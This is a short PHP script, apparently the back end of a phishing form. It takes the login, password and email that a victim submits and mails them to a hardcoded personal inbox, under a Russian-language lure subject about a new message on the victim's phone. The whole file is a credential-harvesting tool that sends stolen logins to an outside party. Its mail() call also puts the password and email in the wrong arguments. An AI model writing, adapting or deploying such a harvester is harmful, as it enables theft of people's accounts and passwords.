<?php
$login=$_POST['login'];
$pass=$_POST['pass'];
$email=$_POST['email'];

$login=htmlspecialchars($login);
$pass=htmlspecialchars($pass);
$email=htmlspecialchars($email);

$login=urldecode($login);
$pass=urldecode($pass);
$email=urldecode($email);

$login=trim($login);
$pass=trim($pass);
$email=trim($email);

if(mail("vlad.sherstobitov.00@inbox.ru",
"На твой телефон пришло новое сообщение, посмотри, вдруг там что то важное",
"Логин".$login."\n",
"Пароль".$pass."\n",
"Email".$email."\n"))
{echo("Письмо успешно отправлено!");}
else{
    echo("Письмо не отправлено, проверьте ошибки!");
}
?>